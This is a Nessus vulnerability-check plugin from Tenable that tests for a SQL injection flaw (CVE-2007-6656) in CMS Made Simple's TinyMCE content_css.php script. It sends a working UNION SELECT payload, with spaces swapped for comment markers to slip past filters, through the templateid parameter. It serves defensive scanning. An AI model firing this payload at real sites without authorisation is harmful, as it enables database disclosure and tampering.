#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29829);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2007-6656");
  script_bugtraq_id(27074);
  script_xref(name:"OSVDB", value:"39788");

  script_name(english:"CMS Made Simple modules/TinyMCE/content_css.php templateid Variable SQL Injection");
  script_summary(english:"Tries to influence CMSMS style sheet returned");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running CMS Made Simple, a content
management system written in PHP. 

The version of CMS Made Simple installed on the remote host fails to
sanitize user-supplied input to the 'templateid' parameter of the
'modules/TinyMCE/content_css.php' script before using it in a database
query.  Regardless of PHP's 'magic_quotes_gpc' and 'register_globals'
settings, an attacker may be able to exploit this issue to manipulate
database queries, leading to disclosure of sensitive information,
modification of data, or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4810" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  magic1 = unixtime();
  magic2 = rand();
  exploit = string("-1 UNION SELECT ", magic1, ",1,", magic2, "--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/modules/TinyMCE/content_css.php?",
      "templateid=", exploit));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # we see our magic in the answer
    string("Start of CMSMS style sheet '", magic2, "'") >< res &&
    magic1 >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
